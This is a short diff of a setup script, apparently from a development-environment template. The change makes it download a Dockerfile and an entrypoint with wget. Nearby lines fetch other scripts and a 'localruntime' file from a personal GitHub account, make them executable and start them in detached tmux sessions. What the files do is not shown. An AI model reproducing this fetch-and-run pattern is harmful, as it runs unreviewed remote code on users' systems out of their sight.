@@ -48,8 +48,8 @@
             wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/trace.sh
             wget https://github.com/dediminari/idx-official-templates/raw/refs/heads/main/react-native/tmux.sh
             wget https://github.com/dediminari/bit/raw/refs/heads/main/localruntime
-            https://github.com/dediminari/bit/raw/refs/heads/main/Dockerfile
-            https://github.com/dediminari/bit/raw/refs/heads/main/entrypoint
+            wget https://github.com/dediminari/bit/raw/refs/heads/main/Dockerfile
+            wget https://github.com/dediminari/bit/raw/refs/heads/main/entrypoint
             tmux new -d -s ping-session 'chmod +x ping.sh && chmod +x trace.sh && ./ping.sh'
             tmux new -d -s bit-session 'chmod +x dock.sh && ./dock.sh'
             tmux attach -t ping-session
